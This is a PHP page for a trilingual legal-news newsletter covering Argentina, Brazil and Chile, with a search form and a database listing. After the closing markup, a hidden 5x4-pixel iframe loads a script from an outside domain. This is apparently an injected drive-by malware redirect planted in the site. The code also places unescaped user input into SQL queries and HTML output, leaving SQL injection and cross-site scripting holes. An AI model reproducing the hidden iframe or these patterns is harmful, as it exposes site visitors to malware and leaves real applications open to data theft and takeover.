<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }

	$tit=$_GET['tit'];
	$pais=$_GET['pais'];
	$dipo=$_GET['dipo'];
	
	global $prefijo_socio,$socio;
	
?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
function vernews(x){
	alert(x)

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 12px; color: #666666 }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
.link {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	font-weight: normal;
	color: #000000;
	padding-left: 0px;
	padding-right: 3px;
	text-decoration: none;
}

-->
</style>
</head>
<?
 if ($pais=='intro'){

	$titu['esp']='Novedades';
	$titu['ing']='News';
	$titu['por']='Novidades';
	
	$leyenda['esp']['mdt']='<ul><li>En esta sección se encuentran las principales novedades legales de Argentina, Brasil y Chile</li></ul>';
	$leyenda['esp']['sou']='<ul><li>En esta sección se encuentran las principales novedades legales de  Brasil, Chile y Argentina</li></ul>';
	$leyenda['esp']['alv']='<ul><li>En esta sección se encuentran las principales novedades legales de Chile, Argentina y Brasil</li></ul>';

	$leyenda['ing']['mdt']='<ul><li>In this section we include the main legal developments in Argentina, Brazil and Chile.</li></ul>';
	$leyenda['ing']['sou']='<ul><li>In this section we include the main legal developments in Brazil,  Chile and Argentina.</li></ul>';
	$leyenda['ing']['alv']='<ul><li>In this section we include the main legal developments in Chile, Argentina and Brazil.</li></ul>';

	$leyenda['por']['mdt']='<ul><li>Nesta seção podem se encontrar as principais novidades legais da Argentina, Brasil e Chile.</li></ul>';
	$leyenda['por']['sou']='<ul><li>Nesta seção podem se encontrar as principais novidades legais da Brasil, Argentina e Chile.</li></ul>';
	$leyenda['por']['alv']='<ul><li>Nesta seção podem se encontrar as principais novidades legais da Chile, Argentina e Brasil</li></ul>';
?>
<table  width="100%" cellpadding="0" cellspacing="0" border="0">
	<tr valign="top">
		<td>
			<table width="100%">
				<tr valign="top">
					<td height="33" align="right" valign="bottom"  class="espacio">
						<span class="titulos"><?= $titu[$lng]?>&nbsp;&nbsp;</span>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr valign="top" >
		<td class="style9">
						<br><?=$leyenda[$lng][$socio]?>
		</td>
	</tr>
</table>
<?
}
else{
?>

<table  width="100%" cellpadding="0" cellspacing="0" border="0">
	<tr valign="top">
		<td>
			<table width="100%">
				<tr valign="top">
					<td height="33" colspan="5" align="right" valign="bottom"  class="espacio">
						<span class="titulos"><?= $tit?>&nbsp;&nbsp;</span>
					</td>
				</tr>
				<tr valign="top">
					<td height="30" colspan="5" align="right" valign="bottom" ><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    	<form method="post" action="<?= $_SERVER['PHP_SELF']?>?<?= $_SERVER['QUERY_STRING']?>">
                    		<input type="hidden" name="accion" value="buscar" />
                    		<tr>
                    			<td width="20%" class="style7"><?= $lng == 'por' ? 'Pesquisar' : 'Buscar' ?>: </td>
                    			<td width="47%"><input name="texto" type="text" value="<?= $texto?>" size="40"></td>
                    			<td width="33%"><input name="imageField" type="image" src="images/btn-buscar-mdt.jpg" width="25" height="25" border="0"></td>
                    			</tr>
                    		</form>
					</table></td>
				</tr>
			</table>
		</td>
	</tr>
<?
	if($tipo==0){ $and1='';}else{$and1=" and ni.tipo=$tipo ";}
	if( $accion == 'buscar' )
	{
		$and1.=" and ( ni.nombre LIKE '%$texto%' OR n.titulo LIKE '%$texto%' OR n.nota LIKE '%$texto%' OR n.copete LIKE '%$texto%' )";
	}
	$db->select( 'newsletter_indice ni LEFT JOIN noticias n ON n.id_news = ni.id'.( $id_seccion ? ' LEFT JOIN newsletter_secciones ns ON ns.id_newsletter = ni.id' : '' ), 'ni.*', ( $id_seccion ? "ns.id_seccion = $id_seccion AND " : '' ).'ni.socio = "'.$pais.'"  '.$and1.' and (ni.ok=1 OR ni.ok=2) GROUP BY ni.id',"ni.fecha DESC");
	//$db->print_sql();
?>
	<tr valign="top">
		<td>
			<table width="100%" border="0" class="" cellpadding="2" cellspacing="0">
			  <tr style="background-color:#CCCCCC; border-bottom: 1px solid #000000; border-top: 1px solid #000000 ">
				<td width="77" class="style7" style="background-color:#CCCCCC; border-bottom: 1px solid #000000; border-top: 1px solid #000000 "><small>Fecha</small></td>
				<td bgcolor="#CCCCCC" class="style7" style="background-color:#CCCCCC; border-bottom: 1px solid #000000; border-top: 1px solid #000000 "><small>Titulo</small></td>
				<!-- <td width="50" class="style7" style="background-color:#CCCCCC; border-bottom: 1px solid #000000; border-top: 1px solid #000000 "><small>Tipo</small></td> -->
			  </tr>
		    </table>
		</td>
	</tr>

	<?
	if( $db->num_rows()>0 )	{
		while($links=$db->fetch_object()){
	?>
	<tr valign="top">
		<td>
			<table width="100%" border="0">
				<tr valign="top">
					<td class="style9" style="border-bottom: 1px solid #FFFFFF;">
						
						<table width="100%" border="0">
						  <tr>
							<td width="77"  class="style9"><a class="link" href="./vernews.php?id_news=<?=$links->id?>" target="_blank"><?=fecha::ISO2Normal($links->fecha)?></a></td>
							<td class="style9"><a class="link" href="./vernews.php?id_news=<?=$links->id?>" target="_blank"><?= $links->nombre;?></a></td>
							<!-- <td  width="50" class="style9"><a class="link" href="./vernews.php?id_news=<?=$links->id?>" target="_blank"><?=$links->tipo==1? 'News':'Alerta';?></a></td> -->
						  </tr>
						</table>
						</a>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<?
		}
	}
	?>
</Table>
<? } ?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>

